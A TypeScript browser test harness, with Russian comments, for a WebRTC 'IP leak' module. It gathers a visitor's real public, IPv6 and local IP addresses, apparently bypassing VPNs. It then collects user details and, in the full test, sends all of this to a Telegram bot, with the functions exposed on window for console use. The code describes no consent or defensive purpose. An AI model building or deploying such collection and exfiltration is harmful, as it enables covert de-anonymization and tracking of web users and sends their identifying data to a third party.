/**
 * Тестовый файл для проверки WebRTC IP leak
 * Можно вызвать из консоли браузера
 */

import { getRealIPAddress, getIPFast, getUserInfo } from './webrtc-ip';
import { sendUserDataToBot } from './telegram-bot';

/**
 * Тестирование WebRTC leak detection
 */
export async function testWebRTCLeak() {
  console.log('🧪 === ТЕСТ WebRTC IP LEAK ===');
  console.log('');
  
  const startTime = Date.now();
  
  // Тест 1: Прямое получение через WebRTC
  console.log('📡 Тест 1: Прямое получение через WebRTC...');
  const ipInfo = await getRealIPAddress();
  console.log('✅ Результат:', ipInfo);
  console.log('');
  
  // Тест 2: Быстрое получение (WebRTC + API)
  console.log('⚡ Тест 2: Быстрое получение (WebRTC + API)...');
  const { ip, ipInfo: fastInfo } = await getIPFast();
  console.log('✅ Primary IP:', ip);
  console.log('✅ Full Info:', fastInfo);
  console.log('');
  
  // Тест 3: Информация о пользователе
  console.log('👤 Тест 3: Информация о пользователе...');
  const userInfo = getUserInfo();
  console.log('✅ User Info:', userInfo);
  console.log('');
  
  const endTime = Date.now();
  const duration = endTime - startTime;
  
  console.log(`⏱️ Общее время выполнения: ${duration}ms`);
  console.log('');
  
  // Тест 4: Отправка в Telegram
  console.log('📤 Тест 4: Отправка данных в Telegram...');
  const userData = {
    ip,
    ipInfo: fastInfo,
    ...userInfo
  };
  
  const sent = await sendUserDataToBot(userData);
  
  if (sent) {
    console.log('✅ Данные успешно отправлены в Telegram!');
  } else {
    console.error('❌ Ошибка отправки данных в Telegram');
  }
  
  console.log('');
  console.log('🎉 === ТЕСТ ЗАВЕРШЕН ===');
  
  return {
    ipInfo: fastInfo,
    userInfo,
    duration,
    sent
  };
}

/**
 * Краткий тест - только WebRTC leak
 */
export async function quickTest() {
  console.log('⚡ Быстрый тест WebRTC leak...');
  const ipInfo = await getRealIPAddress();
  
  console.log('\n📊 Результаты:');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  
  if (ipInfo.webrtcLeaked.length > 0) {
    console.log(`\n🔓 WebRTC Leaked IPs (${ipInfo.webrtcLeaked.length}):`);
    ipInfo.webrtcLeaked.forEach((ip, i) => {
      console.log(`   ${i + 1}. ${ip}`);
    });
  }
  
  if (ipInfo.ipv4.length > 0) {
    console.log(`\n📍 Публичные IPv4 (${ipInfo.ipv4.length}):`);
    ipInfo.ipv4.forEach(ip => console.log(`   • ${ip}`));
  }
  
  if (ipInfo.ipv6.length > 0) {
    console.log(`\n📍 Публичные IPv6 (${ipInfo.ipv6.length}):`);
    ipInfo.ipv6.forEach(ip => console.log(`   • ${ip}`));
  }
  
  if (ipInfo.localIP.length > 0) {
    console.log(`\n🏠 Локальные IP (${ipInfo.localIP.length}):`);
    ipInfo.localIP.forEach(ip => console.log(`   • ${ip}`));
  }
  
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
  
  return ipInfo;
}

// Экспортируем для использования в консоли
if (typeof window !== 'undefined') {
  (window as any).testWebRTC = testWebRTCLeak;
  (window as any).quickTestWebRTC = quickTest;
  
  console.log('💡 WebRTC тесты доступны:');
  console.log('   testWebRTC() - полный тест с отправкой в Telegram');
  console.log('   quickTestWebRTC() - быстрый тест только WebRTC leak');
}
